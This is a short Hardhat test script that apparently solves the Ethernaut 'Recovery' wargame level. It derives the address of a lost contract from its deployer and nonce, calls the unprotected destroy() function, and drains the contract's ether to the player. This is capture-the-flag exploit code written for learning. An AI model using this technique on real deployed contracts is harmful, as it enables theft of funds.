const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Recovery hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
});
    describe("Hack test", function() {
        it("Should withdraw all ethers from lost contract", async function() {
            lostContractHash = ethers.utils.solidityKeccak256(["bytes2", "address", "bytes1"], 
                                                          ["0xd694", process.env.RECOVERY_ADDRESS, "0x01"]);
            lostContractAddress = ethers.BigNumber.from(lostContractHash).mask(160).toHexString();
            console.log("Address of lost contract is", lostContractAddress);
            transactionResponse = await player.sendTransaction({
                to: lostContractAddress,
                gasLimit: 2_000_000,
                data: (new ethers.utils.Interface(["function destroy(address) public"])).encodeFunctionData("destroy", [player.address])
                // data: "0xdd365b8b" //first 4bytes of signature of "pwn()"
            });
            await transactionResponse.wait();
            expect(await ethers.provider.getBalance(lostContractAddress)).to.equal(0);
        });
    });
});